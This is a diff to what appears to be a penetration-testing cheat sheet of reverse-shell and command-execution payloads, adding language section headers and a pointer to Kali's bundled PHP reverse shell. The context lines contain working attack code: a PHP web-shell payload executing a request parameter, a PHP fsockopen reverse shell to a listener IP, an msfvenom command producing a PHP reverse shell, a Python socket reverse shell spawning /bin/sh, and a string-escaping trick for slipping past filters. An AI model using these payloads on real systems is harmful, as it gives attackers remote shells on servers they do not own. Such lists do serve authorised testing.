@@ -1,3 +1,5 @@
+# PHP
+
 ## PHP Command Execution
 
 Payload: echo passthru($_REQUEST["cmd"])
@@ -11,11 +13,18 @@ $sock=fsockopen("10.10.10.1",5555);
 exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 
+## Kali Built-in PHP Reverse Shell
+
+`/usr/share/webshells/php/php-reverse-shell.php`
+
+
 ## MsfVenom PHP Reverse Shell
 
 ```
 msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=5555 -o ./rs.php
 ```
+
+# Node.js
 
 ## Node.js Reverse Shell
 
@@ -34,6 +43,7 @@ JavaScript strings can be escaped:
 
 - unicode encode: "/" ->  "\\\\u002f"
 
+# Python
 
 ## Python Reverse Shell
 
@@ -46,6 +56,8 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
+
+# Other 
 
 ## Serve Reverse Shell Remotely
 
